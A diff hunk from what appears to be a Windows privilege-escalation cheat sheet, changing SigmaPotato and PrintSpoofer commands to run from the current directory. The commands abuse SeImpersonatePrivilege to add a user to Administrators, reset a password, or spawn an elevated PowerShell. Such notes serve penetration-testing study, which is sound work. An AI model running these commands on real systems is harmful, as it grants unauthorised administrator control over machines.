@@ -730,13 +730,13 @@ winPEASx64.exe
 
 ### SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
 ```ps
-SigmaPotato.exe "net localgroup Administrators <user> /add"
+.\SigmaPotato.exe "net localgroup Administrators <user> /add"
 ```
 ```ps
-SigmaPotato.exe "net user <username> <newpassword>"
+.\SigmaPotato.exe "net user <username> <newpassword>"
 ```
 ```ps
-PrintSpoofer64.exe -i -c powershell.exe
+.\PrintSpoofer64.exe -i -c powershell.exe
 ```
 
 ### File Permissions: Everyone [AllAccess] in WinPeas
